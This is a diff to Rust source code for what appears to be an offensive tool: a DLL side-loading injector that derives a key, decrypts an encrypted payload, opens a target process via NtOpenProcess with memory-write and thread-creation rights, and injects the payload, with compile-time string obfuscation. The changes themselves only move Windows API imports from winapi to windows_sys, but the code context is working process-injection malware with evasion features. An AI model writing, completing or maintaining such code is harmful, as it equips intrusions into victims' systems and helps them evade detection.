@@ -66,7 +66,7 @@ const HKDF_SALT_ENC: &[u8] = &string_crypt::enc_str!("SYS_HKDF_SALT");
 ///
 /// Returns `out_len` bytes of OKM, or panics if `out_len > 255 * 32`.
 fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> Vec<u8> {
-    use hmac::{Hmac, Mac};
+    use hmac::{Hmac, KeyInit, Mac};
     use sha2::Sha256;
     type HmacSha256 = Hmac<Sha256>;
 
@@ -206,11 +206,10 @@ fn rc4_encrypt(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
 impl crate::injection::Injector for DllSideLoadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use crate::injection::payload_has_valid_pe_headers;
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
-        use winapi::um::winnt::{
-            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-            PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE,
-        };
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+        use crate::win_types::PAGE_READWRITE;
+        const SYNCHRONIZE: u32 = 0x00100000;
+        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
 
         // ── 1. Derive the decryption key from the build-time seed ──────────
         let key = derive_payload_key();
@@ -232,8 +231,8 @@ impl crate::injection::Injector for DllSideLoadInjector {
         // ── 4. Open target process via NtOpenProcess ───────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         let access_mask = (PROCESS_VM_OPERATION
@@ -462,11 +461,10 @@ impl DllSideLoadInjector {
         payload: &[u8],
         export_config: &ExportConfig,
     ) -> Result<()> {
-        use winapi::um::winnt::{
-            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
-            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-            SYNCHRONIZE,
-        };
+        const SYNCHRONIZE: u32 = 0x00100000;
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
+        use crate::win_types::PAGE_READWRITE;
 
         // ── 1. Derive key and decrypt payload ─────────────────────────────
         let key = derive_payload_key();
@@ -475,8 +473,8 @@ impl DllSideLoadInjector {
         // ── 2. Open target process via NtOpenProcess ──────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         let access_mask = (PROCESS_VM_OPERATION
